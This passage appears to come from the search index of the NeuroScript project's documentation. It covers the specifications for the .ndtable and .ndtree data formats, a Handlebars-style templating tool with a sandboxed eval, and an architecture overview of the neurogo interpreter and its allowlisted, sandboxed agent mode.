explicitly defined schema and validation rules embedded within the file. This format is intended for storing hundreds or thousands of rows for simple lookup and CRUD (Create, Read, Update, Delete) operations, primarily by tools and AI, while remaining easily inspectable by humans. Joins between tables are not an explicit design goal for this format.</p>"},{"location":"NeuroData/table/#2-syntax","title":"2. Syntax","text":"<p>A <code>.ndtable</code> file consists of the following sections in order: 1.  File-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Schema Definition: Zero or more <code>COLUMN</code> definition lines defining the table structure and constraints. 3.  Data Separator: A line containing exactly <code>--- DATA ---</code> to mark the end of the schema and the beginning of data rows. 4.  Data Rows: Zero or more lines representing the table data, with columns delimited by a specific character (pipe <code>|</code>).</p> <p>Comments (<code>#</code> or <code>--</code>) and blank lines can appear before the Schema Definition and between <code>COLUMN</code> lines. They are generally ignored within the Data Rows section, unless a specific tool interprets commented-out data rows.</p>"},{"location":"NeuroData/table/#21-file-level-metadata","title":"2.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: Table</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_table_id&gt;</code> (Optional) * <code>:: primaryKey: &lt;column_name&gt;</code> (Optional, indicates the primary key column) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/table/#22-schema-definition-section","title":"2.2 Schema Definition Section","text":"<p>This section defines the columns, their types, and validation rules. * Format: <code>COLUMN column_name data_type [validation_rules...]</code> * <code>COLUMN</code>: Keyword. * <code>column_name</code>: Identifier for the column (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). Must be unique within the table. * <code>data_type</code>: Specifies the expected data type. Supported types:     * <code>string</code>: Text data.     * <code>int</code>: 64-bit signed integer.     * <code>float</code>: 64-bit floating-point number.     * <code>bool</code>: Boolean (<code>true</code> or <code>false</code>).     * <code>timestamp</code>: ISO 8601 format timestamp string (e.g., <code>2024-01-15T10:00:00Z</code>).     * <code>enum(\"value1\", \"value2\", ...)</code>: String restricted to one of the specified quoted values. * <code>[validation_rules...]</code>: Optional space-separated validation keywords and arguments:     * <code>NOT NULL</code>: The column cannot contain an empty value.     * <code>UNIQUE</code>: The value in this column must be unique across all rows in the table.     * <code>REGEX(\"pattern\")</code>: The string value must match the provided Go regular expression pattern.     * <code>MIN(value)</code>: The numeric/timestamp value must be greater than or equal to <code>value</code>.     * <code>MAX(value)</code>: The numeric/timestamp value must be less than or equal to <code>value</code>.     * <code>DEFAULT(value)</code>: Specifies a default value if none is provided on insert. The <code>value</code> should be interpretable as the column's <code>data_type</code> (e.g., <code>DEFAULT(0)</code>, <code>DEFAULT(\"pending\")</code>, <code>DEFAULT(true)</code>). <code>DEFAULT(NOW)</code> is a special value for <code>timestamp</code> columns, indicating the current time on insert/update.</p>"},{"location":"NeuroData/table/#23-neuroscript-fragment-rules-planned-for-future-versions","title":"2.3 NeuroScript Fragment Rules (Planned for Future Versions)","text":"<p>(Note: The following rules using <code>VALIDATE_NS</code> and <code>DEFAULT_NS</code>/<code>GENERATE_NS</code> are planned features and not part of the v0.1.0 specification. They are included here for design context.) * <code>VALIDATE_NS(\"neuroscript_expression\")</code>: (Future) The string value must satisfy the NeuroScript expression, which should evaluate to <code>true</code>. The expression can use <code>{{value}}</code> to refer to the value being validated. Example: <code>VALIDATE_NS(\"{{value}} &gt;= 0 AND {{value}} &lt; 100\")</code>. * <code>DEFAULT_NS(\"neuroscript_expression\")</code>: (Future) Uses the result of the NeuroScript expression as the default value. Example: <code>DEFAULT_NS(\"CALL TOOL.GenerateUUID()\")</code>. * <code>GENERATE_NS(\"neuroscript_expression\")</code>: (Future) The value for this column is always generated by the NeuroScript expression, potentially using other row values via <code>{{row.column}}</code>. Example: <code>GENERATE_NS(\"'{{row.first}}' + ' ' + '{{row.last}}'\")</code>.</p>"},{"location":"NeuroData/table/#24-data-separator","title":"2.4 Data Separator","text":"<p>A single line containing exactly <code>--- DATA ---</code> MUST follow the last Schema Definition line (or metadata if no schema).</p>"},{"location":"NeuroData/table/#25-data-rows-section","title":"2.5 Data Rows Section","text":"<ul> <li>Each line represents one row in the table.</li> <li>Columns are separated by the pipe character (<code>|</code>). Leading/trailing whitespace around the pipe delimiter AND within a cell is significant unless tools specifically trim it.</li> <li>The number of delimiters should correspond to the number of columns defined in the schema (i.e., <code>num_columns - 1</code> pipe characters).</li> <li>Escaping:<ul> <li>To include a literal pipe character (<code>|</code>) within a cell's data, it should be escaped as <code>\\|</code>.</li> <li>To include a literal backslash (<code>\\</code>) within a cell's data, it should be escaped as <code>\\\\</code>.</li> <li>Newlines within cell data are generally discouraged for simplicity. If needed, they could be represented by <code>\\n</code> (literal backslash-n), requiring tools to interpret this sequence during read/write. Representing actual multi-line text is better handled using attached data blocks or separate notes fields.</li> </ul> </li> <li>Null/Empty vs. Default: An empty string between delimiters (e.g., <code>value1||value3</code>) represents an empty/null value for the second column. If a <code>DEFAULT</code> rule exists for that column, tools should apply it during insertion if the value is empty.</li> </ul>"},{"location":"NeuroData/table/#3-ebnf-grammar-draft","title":"3. EBNF Grammar (Draft)","text":"<pre><code>table_file        ::= { metadata_line | comment_line | blank_line }\n                    schema_section\n                    data_separator newline\n                    data_section ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per graph spec *)\nschema_section      ::= { column_definition | comment_line | blank_line } ;\ncolumn_definition ::= optional_whitespace \"COLUMN\" whitespace column_name whitespace data_type { whitespace validation_rule } newline ;\ncolumn_name       ::= identifier ;\ndata_type         ::= \"string\" | \"int\" | \"float\" | \"bool\" | \"timestamp\" | enum_definition ;\nenum_definition    ::= \"enum(\" quoted_string { \",\" quoted_string } \")\" ;\nvalidation_rule   ::= \"NOT\" whitespace \"NULL\" | \"UNIQUE\" | regex_rule | minmax_rule | default_rule | ns_validation_rule ; (* ns_* are future *)\nregex_rule        ::= \"REGEX(\" quoted_string \")\" ;\nminmax_rule       ::= (\"MIN\" | \"MAX\") \"(\" simple_value \")\" ;\ndefault_rule      ::= \"DEFAULT(\" (simple_value | \"NOW\") \")\" ;\nns_validation_rule::= \"VALIDATE_NS(\" quoted_string \")\" ; (* Future *)\n\ndata_separator    ::= optional_whitespace \"--- DATA ---\" optional_whitespace ;\n\ndata_section      ::= { data_row } ;\ndata_row          ::= cell_value { optional_whitespace \"|\" optional_whitespace cell_value } newline ;\ncell_value        ::= { character_except_pipe_or_newline | escaped_pipe | escaped_backslash | escaped_newline } ; (* Needs refinement *)\n\n(* Define: identifier, key, value, rest_of_line, quoted_string, simple_value, number_literal, boolean_literal, whitespace, newline, comment_line, blank_line, escaped_pipe, escaped_backslash, escaped_newline *)\n</code></pre>"},{"location":"NeuroData/table/#4-tool-interaction-crud","title":"4. Tool Interaction (CRUD)","text":"<p>Tools interacting with <code>.ndtable</code> files (e.g., <code>TOOL.ReadTable</code>, <code>TOOL.InsertRow</code>, <code>TOOL.UpdateRow</code>, <code>TOOL.DeleteRow</code>) should: 1.  Parse the schema section first. 2.  Validate data during <code>InsertRow</code> and <code>UpdateRow</code> operations against the defined <code>data_type</code> and <code>validation_rules</code>. 3.  Apply <code>DEFAULT</code> values during <code>InsertRow</code> if a column value is missing or empty. 4.  Enforce <code>UNIQUE</code> constraints. 5.  Handle escaping/unescaping of <code>|</code>, <code>\\</code>, and potentially <code>\\n</code> when reading/writing data rows. 6.  (Future) Execute <code>VALIDATE_NS</code> fragments during validation and <code>DEFAULT_NS</code>/<code>GENERATE_NS</code> during row creation/modification.</p>"},{"location":"NeuroData/table/#5-example","title":"5. Example","text":"<pre><code>:: type: Table\n:: version: 0.1.0\n:: primaryKey: user_id\n:: description: Example user table.\n\n# Schema\nCOLUMN user_id  int     NOT NULL UNIQUE MIN(1)\nCOLUMN name     string  NOT NULL REGEX(\"^[A-Za-z ]+$\")\nCOLUMN email    string  UNIQUE\nCOLUMN status   enum(\"active\", \"inactive\", \"pending\") DEFAULT(\"pending\")\nCOLUMN created  timestamp DEFAULT(NOW)\n# COLUMN score    int     DEFAULT(0) VALIDATE_NS(\"{{value}} &gt;= 0\") # Future Example\n\n--- DATA ---\n1 | Alice | alice@example.com | active | 2024-01-15T10:00:00Z\n2 | Bob   | bob@example.com   |        | 2024-01-16T11:30:00Z\n3 | Charlie | charlie@test.com | active | 2024-02-01T09:00:00Z\n4 | David | david@domain.org | pending | 2024-03-10T15:45:10Z\n5 | Eve   | eve@domain.org    | inactive| 2024-03-11T16:00:00Z\n</code></pre>"},{"location":"NeuroData/templates/","title":"NeuroScript Templating Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/script spec.md, docs/metadata.md, docs/references.md :: howToUpdate: Refine syntax details, restricted eval scope/allowlist, escaping rules, examples.</p>"},{"location":"NeuroData/templates/#1-purpose","title":"1. Purpose","text":"<p>NeuroScript Templating provides a mechanism for generating text-based output (e.g., configuration files, code, reports, messages) by combining a template with structured data. It aims for a balance between simplicity, readability, necessary logic (conditionals, loops), and safety.</p>"},{"location":"NeuroData/templates/#metadata","title":"Metadata","text":"<ol> <li>Type should be template (<code>:: type: template</code>)</li> <li>**Grammar should be hbars (<code>:: grammar: hbars</code>)</li> <li>Target Grammar Metadata (<code>:: templateFor:</code>): Included to provide explicit context about the template's intended output format. This enables tools to perform format-specific validation or apply context-aware escaping (e.g., HTML escaping).</li> </ol>"},{"location":"NeuroData/templates/#2-design-choices-rationale","title":"2. Design Choices &amp; Rationale","text":"<p>The chosen approach is based on Handlebars syntax, incorporating specific NeuroScript integrations: * Handlebars-like Syntax: Selected over Go's <code>text/template</code> for better readability and language neutrality, aligning with NeuroScript's goals. Preferred over strict Mustache to allow essential control flow (<code>if</code>, <code>each</code>) directly within templates. * Restricted <code>eval</code>: Acknowledges the need for simple dynamic computations within templates (beyond basic variable substitution) but prioritizes safety. Direct NeuroScript execution within templates is disallowed; instead, an <code>{{eval \"...\"}}</code> helper provides access to a sandboxed NeuroScript expression evaluator with a very limited function/tool allowlist and access only to template data. * Tool-Based Implementation: Templating is exposed via a NeuroScript tool (<code>TOOL.RenderTemplate</code>) rather than adding new syntax to the core NeuroScript language, keeping the language itself simpler.</p>"},{"location":"NeuroData/templates/#3-template-syntax-handlebars-based","title":"3. Template Syntax (Handlebars-based)","text":"<p>Templates use syntax familiar from Handlebars:</p> <ul> <li>Variable Substitution: <code>{{ variableName }}</code> or <code>{{ data.path.to.variable }}</code>. The renderer will look up <code>variableName</code> in the provided data map. Dot notation accesses nested map values or fields.</li> <li>HTML Escaping: By default, the output of <code>{{ variableName }}</code> should be escaped appropriate to the <code>:: templateFor:</code> context (e.g., HTML escaped if <code>templateFor: html</code>). Use triple braces <code>{{{ variableName }}}</code> to output raw, unescaped content (use with caution!).</li> <li>Conditionals (<code>if</code>): <pre><code>{{#if conditionVariable}}\n  Output when conditionVariable is truthy.\n{{else}}\n  Optional output when conditionVariable is falsey.\n{{/if}}\n</code></pre> (Truthy/falsey follows NeuroScript rules: <code>false</code>, <code>0</code>, <code>\"\"</code>, <code>nil</code>, empty lists/maps are falsey; others are truthy).</li> <li>Iteration (<code>each</code>): <pre><code>{{#each listVariable}}\n  Item: {{this}} Index: {{@index}}\n{{/each}}\n\n{{#each mapVariable}}\n  Key: {{@key}} Value: {{this}}\n{{/each}}\n</code></pre><ul> <li>Iterates over lists or map keys. <code>{{this}}</code> refers to the current item/value. <code>{{@index}}</code> and <code>{{@key}}</code> provide context.</li> </ul> </li> <li>Comments: <code>{{! This is a template comment and will not appear in output }}</code> or <code>{{!-- Another comment style --}}</code></li> </ul>"},{"location":"NeuroData/templates/#31-restricted-expression-evaluation-eval","title":"3.1 Restricted Expression Evaluation (<code>eval</code>)","text":"<ul> <li>Syntax: <code>{{eval \"NeuroScriptExpressionString\"}}</code></li> <li>Functionality: Evaluates the <code>NeuroScriptExpressionString</code> using the core NeuroScript expression engine [cite: uploaded:neuroscript/pkg/core/evaluation_main.go].</li> <li>Restrictions:<ul> <li>Scope: The expression can ONLY access data passed into the template, likely via a predefined namespace (e.g., <code>data</code>). Example: <code>{{eval \"data.price * 1.1\"}}</code>. It CANNOT access main NeuroScript variables or <code>LAST</code>.</li> <li>Allowlist: The expression evaluator runs with a highly restricted allowlist of built-in functions and operators. Only pure, safe operations (e.g., arithmetic <code>+ - * / % **</code>, string concatenation <code>+</code>, comparisons <code>== &gt; &lt;</code>, basic math functions like <code>LN</code>, safe string tools like <code>TOOL.StringLength</code>, <code>TOOL.ToUpper</code> [cite: uploaded:neuroscript/pkg/core/tools_string.go]) are permitted. Crucially, no I/O tools (<code>TOOL.ReadFile</code>, <code>TOOL.WriteFile</code>), no <code>TOOL.ExecuteCommand</code>, no <code>CALL LLM</code>, no <code>TOOL.Git*</code>, etc., are allowed. This prevents templates from having side effects.</li> </ul> </li> <li>Purpose: Intended for simple calculations or formatting logic directly within the template where basic Handlebars helpers are insufficient.</li> </ul>"},{"location":"NeuroData/templates/#4-template-source-and-metadata","title":"4. Template Source and Metadata","text":"<ul> <li>Templates can be provided as:<ul> <li>A literal string.</li> <li>A reference to a file: <code>[ref:path/to/template.hbs]</code></li> <li>A reference to a block: <code>[ref:this#template-block]</code></li> </ul> </li> <li>The source (file or block) MUST include metadata specifying the target output format:<ul> <li><code>:: templateFor: &lt;format_id&gt;</code></li> <li><code>format_id</code> examples: <code>text</code>, <code>markdown</code>, <code>json</code>, <code>yaml</code>, <code>html</code>, <code>xml</code>, <code>neuroscript</code>, <code>go</code>, <code>python</code>, etc.</li> <li>This metadata guides validation and potential automatic escaping by rendering tools.</li> </ul> </li> </ul>"},{"location":"NeuroData/templates/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>Template rendering is performed by a dedicated NeuroScript tool: * <code>TOOL.RenderTemplate(template_ref, data_map)</code>     * <code>template_ref</code> (String or Reference): A string containing the template content OR a <code>[ref:...]</code> string pointing to the template file/block.     * <code>data_map</code> (Map): A NeuroScript map containing the data accessible within the template (e.g., under the <code>data</code> namespace).     * Returns: (String) The rendered output, or an error message string if rendering fails (parsing error, <code>eval</code> error, etc.).</p>"},{"location":"NeuroData/templates/#6-example","title":"6. Example","text":"<p>Template Source (e.g., in a block with <code>:: id: report-tpl</code>): <pre><code>:: templateFor: markdown\n:: version: 1.0\n\n# Report for {{data.user_name}}\n\n{{#if data.is_active}}\nStatus: Active\n{{else}}\nStatus: Inactive\n{{/if}}\n\n## Items ({{eval \"CALL TOOL.StringLength(data.items)\"}} total)\n\n{{#each data.items}}\n* Item {{@index}}: {{this.name}} - Price: ${{eval \"this.price * 1.0\"}} - Tax: ${{eval \"this.price * data.tax_rate\"}}\n{{/each}}\n\nTotal Value (excl. tax): ${{eval \"CalculateTotal(data.items)\"}} {{! Example assuming CalculateTotal is a SAFE allowed function }}\n\nReport generated: {{data.timestamp}}\n</code></pre></p> <p>NeuroScript Usage: <pre><code>SET user_data = {\n  \"user_name\": \"Alice\",\n  \"is_active\": true,\n  \"items\": [\n    {\"name\": \"Thing 1\", \"price\": 10.50},\n    {\"name\": \"Thing 2\", \"price\": 25.00}\n  ],\n  \"tax_rate\": 0.05,\n  \"timestamp\": \"2024-07-26\"\n}\n\n# Assume CalculateTotal is a safe, allowlisted function for eval\n# Or calculate total beforehand and pass it in user_data\n\nCALL TOOL.RenderTemplate(\"[ref:this#report-tpl]\", user_data)\nSET report_output = LAST\n\nEMIT report_output\n</code></pre></p> <p>Expected Output (Conceptual): <pre><code># Report for Alice\n\nStatus: Active\n\n## Items (2 total)\n\n* Item 0: Thing 1 - Price: $10.5 - Tax: $0.525\n* Item 1: Thing 2 - Price: $25 - Tax: $1.25\n\nTotal Value (excl. tax): $35.5\n\nReport generated: 2024-07-26\n</code></pre></p>"},{"location":"NeuroData/tree/","title":"NeuroData Tree Format (.ndtree) Specification","text":"<p>:: type: TreeFormatSpec :: version: 0.1.0 :: status: draft :: grammar: graph :: grammarVer: 0.1.0 :: dependsOn: docs/neurodata/graph.md, docs/metadata.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review tree syntax, property attachment, EBNF, ensure consistency with graph spec.</p>"},{"location":"NeuroData/tree/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Trees (<code>.ndtree</code>) provide a simple, human-readable plain-text format specifically for representing hierarchical tree structures. The format emphasizes readability through indentation while remaining machine-parseable. It is designed primarily to be read by humans and updated by tools or AI.</p>"},{"location":"NeuroData/tree/#2-relation-to-graph-format","title":"2. Relation to Graph Format","text":"<p>The <code>.ndtree</code> format is considered a specialized profile of the <code>.ndgraph</code> format (see <code>:: grammar: graph</code> metadata). It leverages the same node definition (<code>NODE NodeID [Props]</code>) and property syntax but uses indentation to represent the primary parent-child relationships instead of explicit edge markers (<code>-&gt;</code>, <code>&lt;-</code>). Tools parsing <code>.ndtree</code> should infer directed edges from parent to child based on indentation. Cycle detection should be performed by validation tools to ensure tree structure integrity.</p>"},{"location":"NeuroData/tree/#3-syntax","title":"3. Syntax","text":"<p>A <code>.ndtree</code> file consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of <code>NODE</code> definitions, where hierarchical relationships are defined by indentation.</p>"},{"location":"NeuroData/tree/#31-file-level-metadata","title":"3.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: Tree</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: grammar: graph</code> (Required) * <code>:: grammarVer: &lt;semver&gt;</code> (Required, refers to the graph spec version) * <code>:: id: &lt;unique_tree_id&gt;</code> (Optional but recommended) * <code>:: root: &lt;NodeID&gt;</code> (Optional, explicitly defines the root node) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/tree/#32-node-definition-line","title":"3.2 Node Definition Line","text":"<ul> <li>Format: <code>Indentation NODE NodeID [Optional Properties]</code></li> <li><code>Indentation</code>: Zero or more spaces or tabs. The level of indentation defines the node's parent in the tree (the nearest preceding node line with less indentation). Consistent indentation (e.g., 2 spaces, 4 spaces) is recommended for readability.</li> <li><code>NODE</code>: Keyword indicating a node definition.</li> <li><code>NodeID</code>: A unique identifier for the node within the tree. Must start with a letter or underscore, followed by letters, numbers, or underscores (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). IDs are case-sensitive.</li> <li><code>[Optional Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the node (see Section 3.4).</li> </ul>"},{"location":"NeuroData/tree/#33-complex-properties-attached-data-block","title":"3.3 Complex Properties (Attached Data Block)","text":"<p>For nodes requiring complex or extensive properties, a standard fenced data block (e.g., JSON, YAML) can be placed immediately following the <code>NODE</code> definition line it applies to. The parser/tool should associate this data block with the preceding node.</p> <p>Example: <pre><code>NODE ConfigNode [label: \"Configuration\"]\n```json\n{\n  \"timeout\": 30,\n  \"retry_policy\": {\n    \"attempts\": 3,\n    \"delay\": \"5s\"\n  },\n  \"enabled_features\": [\"featureA\", \"featureC\"]\n}\n</code></pre>   NODE ChildNode ... # Next node definition starts here <pre><code>### 3.4 Simple Property Definitions (Inline)\n\nSimple properties can be included directly within square brackets `[]` on the `NODE` line.\n* Format: `[key1: value1, key2: value2, ...]`\n* Enclosed in square brackets `[]`.\n* Consists of one or more comma-separated `key: value` pairs.\n* `key`: A simple identifier (letters, numbers, underscore, hyphen).\n* `value`: Can be:\n    * A number (`123`, `4.5`, `-10`).\n    * A boolean (`true`, `false`).\n    * A quoted string (`\"like this\"`, `'or this'`). Allows standard escapes.\n    * An unquoted simple string (no spaces or special characters like `[]:,\"`).\n* (Refer to `graph.md` specification for more detailed value parsing rules if needed).\n\n### 3.5 Comments and Blank Lines\n\nLines starting with `#` or `--` (after optional whitespace) are comments and are ignored. Blank lines are also ignored.\n\n## 4. EBNF Grammar (Draft)\n\n(* EBNF-like notation for NeuroData Tree (.ndtree) - Focus on indentation *)\n```ebnf\ntree_file         ::= { metadata_line | comment_line | blank_line } node_list ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per graph spec *)\nkey               ::= identifier ;\nvalue             ::= rest_of_line ;\n\nnode_list         ::= { node_definition } ;\n\nnode_definition   ::= indentation \"NODE\" whitespace node_id [ whitespace property_block ] newline [ fenced_data_block ] ;\nnode_id           ::= identifier ;\nindentation       ::= { \" \" | \"\\t\" } ; (* Parsed to determine level *)\n\nproperty_block    ::= \"[\" property_list \"]\" ; (* As per graph spec *)\nproperty_list     ::= property_entry { \",\" property_entry } ;\nproperty_entry    ::= optional_whitespace key optional_whitespace \":\" optional_whitespace property_value optional_whitespace ;\nproperty_value    ::= number_literal | boolean_literal | string_literal | simple_string ;\n\nfenced_data_block ::= optional_whitespace \"```\" [ language_tag ] newline { text_line } optional_whitespace \"```\" newline ;\nlanguage_tag      ::= identifier ; (* e.g., json, yaml *)\ntext_line         ::= any_character_except_backticks newline ;\n\n(* Standard definitions needed: identifier, number_literal, boolean_literal, string_literal, simple_string, whitespace, newline, comment_line, blank_line *)\n</code></pre> (Note: This EBNF emphasizes the structure. A full parser would need logic to track indentation levels to build the tree hierarchy.)</p>"},{"location":"NeuroData/tree/#5-rendering","title":"5. Rendering","text":"<p>Similar to graphs, <code>.ndtree</code> files can be rendered into various visual formats. Tools could generate: * Text-based tree diagrams: Using characters like <code>\u251c\u2500</code>, <code>\u2514\u2500</code>, <code>\u2502</code>. * DOT Language: For Graphviz visualization, translating the inferred parent-child edges. * Other formats: JSON, XML, etc.</p>"},{"location":"NeuroData/tree/#6-example","title":"6. Example","text":"<pre><code>:: type: Tree\n:: version: 0.1.0\n:: grammar: graph\n:: grammarVer: 0.1.0\n:: id: file-system-example\n:: root: Root\n\nNODE Root [label: \"/\", type: \"dir\"]\n  NODE Documents [label: \"Documents\", type: \"dir\"]\n    NODE Resume.docx [label: \"Resume.docx\", size: 150kb]\n    NODE Report.pdf [label: \"Report.pdf\", size: 2mb]\n      # Example of attaching complex data to Report.pdf\n      ```json\n      {\n        \"author\": \"A. Price\",\n        \"keywords\": [\"report\", \"analysis\", \"neurodata\"],\n        \"revision_history\": [\n          {\"version\": \"1.0\", \"date\": \"2024-01-10\"},\n          {\"version\": \"1.1\", \"date\": \"2024-02-15\"}\n        ]\n      }\n      ```\n  NODE Downloads [label: \"Downloads\", type: \"dir\"]\n    NODE Image.jpg [label: \"Image.jpg\"]\n  NODE Config.sys [label: \"Config.sys\", hidden: true]\n</code></pre>"},{"location":"front/architecture/","title":"Architecture","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: architecture-v0.1 :: status: draft :: dependsOn: docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md, docs/llm_agent_facilities.md, pkg/core/interpreter.go, pkg/neurogo/app.go :: howToUpdate: Review and update component descriptions and interaction flows as the implementation evolves. Update diagrams as needed.  </p>"},{"location":"front/architecture/#neuroscript-architecture","title":"NeuroScript Architecture","text":"<p>This document provides a high-level overview of the main components comprising the NeuroScript ecosystem and how they interact.</p>"},{"location":"front/architecture/#core-components","title":"Core Components","text":"<p>The NeuroScript project consists of three primary parts working together:</p> <ul> <li> <p>neuroscript (<code>.ns.txt</code>): The scripting language itself. It's a simple, readable, procedural language designed for defining \"skills\" or procedures. It combines basic control flow (<code>IF</code>, <code>WHILE</code>, <code>FOR EACH</code>), state management (<code>SET</code>), and crucially, calls to external logic (<code>CALL TOOL.*</code>, <code>CALL LLM</code>, <code>CALL OtherProcedure</code>). See the Language Specification.</p> </li> <li> <p>neurodata (<code>.nd*</code>): A suite of simple, plain-text data formats designed for clarity and ease of parsing. Examples include checklists (<code>.ndcl</code>), tables (<code>.ndtable</code>), graphs (<code>.ndgraph</code>), trees (<code>.ndtree</code>), map schemas (<code>.ndmap_schema</code>), and more. These formats allow structured data exchange between humans, AI, and tools. See the NeuroData Overview and specific format specifications in docs/NeuroData/.</p> </li> <li> <p>neurogo: The reference implementation, written in Go [since you program mostly in golang]. It serves two main roles:</p> <ol> <li>Interpreter: Parses and executes <code>.ns.txt</code> script files directly, managing state and calling registered TOOLs or LLMs as instructed by the script.</li> <li>Agent Backend (Experimental): Acts as a secure execution environment for an external LLM (like Gemini). It receives requests from the LLM (via Function Calling), validates them against security policies (allowlists, sandboxing), executes permitted TOOLs, and returns results to the LLM. See the Agent Facilities Design. See the neurogo source code and CLI implementation.</li> </ol> </li> </ul>"},{"location":"front/architecture/#component-interaction-workflow","title":"Component Interaction / Workflow","text":"<p>How these components interact depends on the mode <code>neurogo</code> is operating in:</p>"},{"location":"front/architecture/#1-script-execution-mode","title":"1. Script Execution Mode","text":"<p>This is the default mode when running <code>neurogo</code> with a script file or procedure name.</p> <p>[Diagram Suggestion: Flowchart for Script Execution Mode: Start -&gt; <code>neurogo</code> CLI receives command (script path, args) -&gt; <code>neurogo</code> parses <code>.ns.txt</code> -&gt; Interpreter loads procedure -&gt; Interpreter executes step -&gt; Evaluation (Expression/Variable?) -&gt; Condition (IF/WHILE/FOR?) -&gt; Action (SET/EMIT/RETURN?) -&gt; Tool Call (-&gt; Go Func) -&gt; LLM Call (-&gt; API) -&gt; Update Interpreter State -&gt; Loop to next step or End.]</p> <ul> <li>Initiation: User executes <code>neurogo</code> via the command line, providing the path to a <code>.ns.txt</code> file (or a specific procedure within a library) and any necessary arguments or flags (like <code>-lib</code>).</li> <li>Parsing: <code>neurogo</code> reads the specified file(s) and uses the NeuroScript parser (built with ANTLR, see parser_api.go) to create an Abstract Syntax Tree (AST) representing the procedures.</li> <li>Interpretation: The <code>Interpreter</code> (interpreter.go) walks the AST of the target procedure.</li> <li>Execution: For each statement:<ul> <li><code>SET</code>: Evaluates the expression and updates the interpreter's current scope.</li> <li><code>IF</code>/<code>WHILE</code>/<code>FOR EACH</code>: Evaluates conditions/collections and controls the execution flow.</li> <li><code>CALL ProcedureName</code>: Pushes a new scope and starts interpreting the called procedure.</li> <li><code>CALL TOOL.FunctionName</code>: Looks up the tool in the <code>ToolRegistry</code> (tools_register.go), validates arguments, executes the corresponding Go function, and stores the result in <code>LAST</code>.</li> <li><code>CALL LLM</code>: Formats the prompt, sends it to the configured LLM API (llm.go), and stores the response text in <code>LAST</code>.</li> <li><code>RETURN</code>: Evaluates the optional expression and passes the result back to the caller (or exits the script).</li> <li><code>EMIT</code>: Evaluates the expression and prints its string form to standard output.</li> </ul> </li> <li>Output: The primary output is typically generated via <code>EMIT</code> statements or the final <code>RETURN</code> value of the main procedure.</li> </ul>"},{"location":"front/architecture/#2-agent-mode","title":"2. Agent Mode","text":"<p>This mode is activated using the <code>-agent</code> flag and related security flags (<code>-allowlist</code>, <code>-denylist</code>, <code>-sandbox</code>).</p> <p>[Diagram Suggestion: Flowchart illustrating Agent Mode: User Box -&gt; Arrow to -&gt; LLM Service Box -&gt; Arrow (Function Call Request) -&gt; NeuroGo Agent Box [contains inner boxes: Security Layer (Allowlist/Validate) -&gt; Tool Executor] -&gt; Arrow (TOOL Execution) -&gt; Local Environment Box -&gt; Arrow (Result) -&gt; NeuroGo Agent Box -&gt; Arrow (Function Response) -&gt; LLM Service Box -&gt; Arrow (Final Answer) -&gt; User Box.]</p> <ul> <li>Initiation: User interacts with an external application (e.g., a chat interface) which communicates with an LLM (like Gemini). <code>neurogo -agent</code> runs as a background process or service.</li> <li>LLM Planning: The LLM receives the user prompt and its list of available \"functions\" (which correspond to the NeuroGo TOOLs declared via configuration). If it decides a tool is needed, it generates a Function Call request.</li> <li>Request Reception: The <code>neurogo</code> agent (app_agent.go) receives the structured Function Call request from the LLM API.</li> <li>Security Validation: The request (tool name, arguments) is passed to the <code>SecurityLayer</code> (security.go).<ul> <li>Checks if the tool is on the allowlist and not on the denylist.</li> <li>Validates and potentially sanitizes arguments. Crucially, file paths are validated against the sandbox root using <code>SecureFilePath</code> logic.</li> <li>Rejects the request if any check fails.</li> </ul> </li> <li>Tool Execution: If validation passes, the agent calls the appropriate Go function for the requested TOOL via the <code>ToolRegistry</code>, passing the validated arguments. The tool executes within the security context (e.g., filesystem access confined to the sandbox).</li> <li>Response Formatting: The result (or error) from the tool execution is formatted into a Function Response structure expected by the LLM API.</li> <li>LLM Continuation: The agent sends the Function Response back to the LLM API. The LLM uses this result to continue its reasoning and either generate another Function Call or formulate a final text response for the user.</li> <li>Output: The final LLM text response is relayed back to the user via the initial application.</li> </ul>"},{"location":"front/architecture/#diagrams","title":"Diagrams","text":"<p>[Diagram Suggestion: High-level block diagram showing the 'neurogo' executable as the central component. It reads/writes '.ns.txt Files (Skills)' and '.nd* Files (Data)'. It contains an 'Interpreter/Agent Core' which uses 'Built-in TOOLs (Go Code)' and interacts via API with an external 'LLM Service'.]</p> <p>(Placeholder for Overall Architecture Diagram)</p> <p>[Diagram Suggestion: Flowchart for Script Execution Mode: Start -&gt; <code>neurogo</code> CLI receives command (script path, args) -&gt; <code>neurogo</code> parses <code>.ns.txt</code> -&gt; Interpreter loads procedure -&gt; Interpreter executes step -&gt; Evaluation (Expression/Variable?) -&gt; Condition (IF/WHILE/FOR?) -&gt; Action (SET/EMIT/RETURN?) -&gt; Tool Call (-&gt; Go Func) -&gt; LLM Call (-&gt; API) -&gt; Update Interpreter State -&gt; Loop to next step or End.]</p> <p>(Placeholder for Script Execution Flow Diagram)</p> <p>[Diagram Suggestion: Flowchart illustrating Agent Mode: User Box -&gt; Arrow to -&gt; LLM Service Box -&gt; Arrow (Function Call Request) -&gt; NeuroGo Agent Box [contains inner boxes: Security Layer 